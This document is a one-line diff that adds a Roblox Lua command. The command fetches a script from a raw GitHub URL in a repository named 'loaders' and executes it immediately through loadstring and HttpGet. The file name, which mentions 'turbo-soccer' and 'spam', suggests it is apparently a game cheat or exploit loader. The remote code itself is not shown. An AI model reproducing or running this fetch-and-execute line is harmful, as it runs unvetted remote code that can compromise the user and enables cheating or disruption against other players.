@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/turbo-soccer-beta-1-0-spam3-fwan3ortokelgz.lua"))()
